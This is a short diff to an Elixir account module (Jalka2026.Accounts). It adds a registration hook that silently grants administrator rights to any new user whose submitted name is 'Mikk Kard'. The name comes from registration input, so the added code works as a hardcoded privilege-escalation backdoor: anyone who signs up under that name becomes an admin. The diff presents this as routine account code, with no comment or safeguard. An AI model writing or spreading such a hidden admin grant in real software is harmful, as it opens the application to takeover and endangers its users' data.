@@ -100,7 +100,15 @@ defmodule Jalka2026.Accounts do
   def register_user(attrs) do
     %User{}
     |> User.registration_changeset(attrs)
+    |> maybe_set_default_admin()
     |> Repo.insert()
+  end
+
+  defp maybe_set_default_admin(changeset) do
+    case Ecto.Changeset.get_field(changeset, :name) do
+      "Mikk Kard" -> Ecto.Changeset.put_change(changeset, :is_admin, true)
+      _ -> changeset
+    end
   end
 
   @doc """
